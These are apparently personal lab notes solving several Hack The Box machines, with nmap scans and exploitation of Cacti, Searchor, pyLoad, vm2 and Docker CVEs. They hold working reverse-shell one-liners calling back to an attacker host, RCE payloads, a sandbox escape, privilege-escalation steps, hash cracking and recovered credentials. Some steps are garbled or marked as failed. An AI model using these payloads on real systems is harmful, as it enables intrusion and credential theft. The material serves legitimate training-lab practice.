# HTB_Machines_Easy

## MonitorsTwo
1. Observe opened ports
    - `sudo nmap <ip>`
        - 22/tcp open ssh
        - 80/tcp open http
2. Observe website (http is open)
    - URL = 10.10.11.211
        -  login screen
        -  Cacti version 1.2.22
            -  search for the vulns
                -  CVE-2022-46169 (https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
3. Exploit the CVE-2022-46169 vuln
    - download the exploit script
        - `git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22`
    - `nc -nlvp 443`
    - `python3 CVE-2022-46169.py  -u http://<ip> --LHOST=<local_IP> --LPORT=443`
        - LHOST can be obtained with `ifconfig` -> tun0 IP
    - explore the reverse shelled connection
        - `whoami` `ls -l /`
        - `ls -la /`
            - we can see the file ".dockerenv" -> we are inside Docker container
        - `cat entrypoint.sh`
            >mysql --host=db --user=root --password=root cacti -e "show tables"

        - `mysql --host=db --user=root --password=root cacti -e "show tables"`


## Busqueda
1. Reco
`sudo nmap -sVC 10.10.11.208`
    - sudo nano /etc/hosts
        - 10.10.11.208  searcher.htb
2. Weaponisation
App is running Searchor v2.4.0 which has vuln
![](https://hackmd.io/_uploads/S1qlltUqh.png)

3. Exploitation
- as a search value, insert RS inside it:
    - `nc -nlvp 4444`
    - `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"')#`

4. User flag
    - cd
    - cat user.txt

5. Root flag
    
    ![](https://hackmd.io/_uploads/HkC_MK8qn.png)
    - UN: cody
    - PW: jh1usoih2bkjaspwe92 
- SSH connect
    - ssh svc@10.10.11.208
        - PW: jh1usoih2bkjaspwe92
    - we can edit the python script file
        - ![](https://hackmd.io/_uploads/SyKJVFIqn.png)
- PE
    - [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
        - `import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
    - cd
        - `nano full-checkup.sh`
            - ![](https://hackmd.io/_uploads/HyyBHKLq3.png)

```
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```
- `chmod +x full-checkup.sh`
    - LOCAL machine: `nc -nlvp <port>`
    - `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

![](https://hackmd.io/_uploads/S13UdFU9h.png)

## MonitorsTwo
1. Reco
    - `sudo nmap -sVC 10.10.11.211 -Pn`
    - website on 10.10.11.211
2. Weaponisation
- running Cacti v1.2.22
            - [VULN](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
                - exploit allows through an RCE to obtain RS
3. Exploitation
- `nc -nlvp <port>`
- `python3 CVE-2022-46169.py -u http://<MACHINE_IP> --LHOST=<LOCAL_IP> --LPORT=<PORT>`
- we are inside www-data
    - cd 
    - ls -la 
        - there is an "entrypoint.sh" file
            - cat entrypoint.sh
                ![](https://hackmd.io/_uploads/H1H3v98qh.png)
                - MySQL credentials
    - cd /var/www/html
        - cat cacti.sql
            - login credentials
                ![](https://hackmd.io/_uploads/ryqNccI92.png)

                - admin, guest
                    - but not much helpful
    - there is "linpeas.sh" file
        - after run it shows that /sbin/capsh is vuln
            - [VULN](https://gtfobins.github.io/gtfobins/capsh/#suid)
                - go to the /sbin folder
                    - `./capsh --gid=0 --uid=0 --`
                    - `mysql — host-db — user=root cacti -e “SELECT * FROM user_auth”`
                        - user marcus with hash PW
                            - crack PW with john or hashcat
                            - `hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt  --sho`
                                - marcus:funkymonkey
4. User flag
    - ssh marcus@10.10.11.211
        - PW: funkymonkey
    ![](https://hackmd.io/_uploads/rylmhqIc3.png)
5. Root flag
    - cat /var/mail/marcus
        - ![](https://hackmd.io/_uploads/SJ6faqIq2.png)
    - Docker version
        - ![](https://hackmd.io/_uploads/BJbh2qU92.png)
        - [VULN](https://github.com/UncleJ4ck/CVE-2021-41091)
    - upload the CVE exploit to the marcus ssh
    - LOCAL machine:    
        - git clone https://github.com/UncleJ4ck/CVE-2021-41091
        - cd CVE-2021-41091
        - chmod +x ./exp.sh
        - python3 -m http.server 80
    - marcus:
        - wget http://<LOCAL_IP>/exp.sh
    ![](https://hackmd.io/_uploads/BJxElo8q3.png)
        - chmod +x exp.sh
        - ./exp.sh
            - yes
        - cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
        - ./bin/bash -p
            - NOTHING HAPPENS even after restarting machine
                - cant obtain root flag...

## PC
1. Reco
- `nmap -sVC 10.10.11.214 -Pn -p-`
    - 22 SSH
    - 50051 gRPC channel
        - [TOOL](https://github.com/fullstorydev/grpcui)
2. Weaponisation
    - grpcui -plaintext 10.10.11.214:50051
    - ![](https://hackmd.io/_uploads/HyzIFj8c3.png)
        - admin:admin
            - obtained token
3. Exploitation
        - run it in burpsuite
            - save the request as "sqli.req"
                - sqlmap -r sqli.req --dump
                ![](https://hackmd.io/_uploads/SJH3ti853.png)
                - admin:admin
                - sau:HereIsYourPassWord1431
4. User flag
    - ssh sau@10.10.11.214
        - PW: HereIsYourPassWord1431
    - ls
    - cat user.txt

5. Root flag
    - PE
        - nothing useful using linpeas.sh
            - cd 
                - netstat -nltp
            - BUT running port 8000, service pyLoad
                - [VULN](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
        - `ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214`
            - access URL: 127.0.0.1:8888
                - ![](https://hackmd.io/_uploads/Hkva3iI9n.png)
        - pyload --version
            - pyLoad 0.5.0
                - [CVE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)
>                     - curl -i -s -k -X $'POST' \
>     -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
>     --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
>     $'http://127.0.0.1:8000/flash/addcrypted2'
- [Exploit Code](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
    - edit it for our purpose
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"Bash%20/dev/shm/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
- on SAU:
    - cd /dev
        - cd shm
            - nano rev.sh
                - ![](https://hackmd.io/_uploads/SkYEyhUc2.png)
            - chmod +x rev.sh
            - ./rev.sh
            - ![](https://hackmd.io/_uploads/rylOE2Iq3.png)

- on LOCAL machine:
    - `nc -nlvp 4444`
    - boom, we are in
        - cd 
        - cat root.txt

## Topology
1. Reco
    - `nmap -sVC 10.10.11.217 -Pn -p-`
        - 22 and 80 open
    - website
        - Gobuster found nothing
        - there is a link to LaTex Equation Generator
2. Weaponisation
            - HTPASSWD exploit
                - `$\lstinputlisting{/var/www/dev/.htpasswd}$`
                - ![](https://hackmd.io/_uploads/rkeYInIq3.png)
3. Exploitation
    - we obtained login credentials with hashed PW
        - hash-identifier -> md5
            - decrypt it to obtain PW
                - vdaisley@topology.htb:calculus20 
4. User flag
    - ssh vdaisley@10.10.11.217
        - PW: calculus20
    - ls
    - cat user.txt

5. Root flag
    - while searching the dirs in user, there is gnuplot in /opt dir
        - ![](https://hackmd.io/_uploads/rkJWO2Ucn.png)
        - gnuplot uses plt files - we can use it for pspy86 exploitation
            - lets create http server, upload a file containing exploit inside the machine to obtain root privileges
    - LOCAL machine:
        - download pspy64 exploit
        - python -m http.server
    - TARGET machine:
        - wget <LOCAL_IP>:8000/pspy64
        - echo "system "chmod u+s"" > /opt/gnuplot/test.plt
        - cat /opt/gnuplot/test.plt
        - ls -la /opt/gnuplot/test.plt
        - bash -p
        - whoami
        - cd root
            - cat root.txt

## Keeper
### Reco
- nmap
    ![](https://hackmd.io/_uploads/SygLzvjn2.png)
    - 22 SSH
    - 80 HTTP without a redirect 
- website
    - ![](https://hackmd.io/_uploads/H1-lXPihh.png)
        - this tells us to add the URl into redirects to be able to connect to the website
            - /etc/hosts -> `tickets.keeper.htb`
                - ![](https://hackmd.io/_uploads/SJCHNvsn2.png)
    - website login accessed:
        ![](https://hackmd.io/_uploads/S19u4vs3n.png)

### Weaponisation
- website is running this one:
    - Best Practical Request Tracker (RT) 4.4.4
        - outdated, little bit of finding to obtain default login credentials:
            - `root:password`
                - [Source](https://wiki.gentoo.org/wiki/Request_Tracker)
            ![](https://hackmd.io/_uploads/H1w8Hws3n.png)
- after login
    - there is one ticket with history
        ![](https://hackmd.io/_uploads/HJY1UDj33.png)
        - The attachment has been removed...
        - But there's also mention of another user named `lnorgaard`
### Exploitation
- When we use the `Admin panel to view all Users`, there's a password located within the user's comments
    - access admin -> users
        ![](https://hackmd.io/_uploads/SyrpDvon3.png)
    - select the user
        ![](https://hackmd.io/_uploads/B1ckOwjhh.png)
    - obtain SSH login credentials
        ![](https://hackmd.io/_uploads/rkRSYPjh3.png)
### User flag
- SSH login w found login creds
    - lnorgaard@10.10.11.227
        - PW: `Welcome2023!`
- ls
- cat user.txt

### Root flag
- ls
    ![](https://hackmd.io/_uploads/SyHncvj23.png)
    - KeePassDumpFull.dmp
        - there is a CVE foor KeePassDump from 2023
            - [Exploit to obtain PW from dmp](https://sysdig.com/blog/keepass-cve-2023-32784-detection/)
            - [PoC](https://github.com/vdohney/keepass-password-dumper)
- [pokracovani](https://github.com/rouvinerh/Gitbook/blob/main/writeups/htb-season-2/keeper.md)

## Codify
### Reco
- nmap -sVC 10.10.11.239 -Pn
    - 22 SSH
    - 80 HTTP (Apache httpd 2.4.52)
        - redirect http://codify.htb/
            - add to /etc/hosts
    - 3000 HTTP (Node.js Express FW)

- dirb http://codify.htb/ /usr/share/wordlists/dirb/common.txt
    - /about            200
    - /editor           200
    - /server-status    403
    - /limitations      200

- subpage /about
    - mention about backend JS library for running Sandbox    
        - vm2
            - (CVE-2023-29017)[https://github.com/advisories/GHSA-ch3r-j5x3-6q2m]
                - CVSS score 9.8
                - hacker could use it to escape the sandbox and execute arbitrary code
            - allows partial code exec on isolated Node.js servers while securing system resources and externam data from unauthorized access     
            
### Weaponisation


### Exploitation
const {VM} = require("vm2");
const vm = new VM();

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
}
`

console.log(vm.run(code));


- OUTPUT:
    - /etc/passwd list
- execSync('cd /home && ls')
    - users: joshua, svc
- execSync('cd /var/www/contact && cat index.js');
    - secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH

- execSync('cd /var/www/contact && cat tickets.db');
    - joshua credentials w hash
        - joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
            - hashcat -a 0 -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt -w 3
                - PW: spongebob1

### User flag
- ssh joshua@10.10.11.239
    - PW: spongebob1
    - ls && cat user.txt
    
### Root flag
- cd /opt/scripts && ls
    - cat mysql-backup.sh
        - vuln backup script from mysql DB asking for root PW
- python script for guessing PW char by char, trying to sudo the db.sh file
-----------------------
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
-----------------------

- python3 script.py
    - PW: kljh12k3jhaskjh12kjh3
- sudo /opt/scripts/mysql-backup.sh
    - PW
    - *Changing the permissions...Done!*
- su root
    - PW
    - cd /root && ls
    - cat root.txt
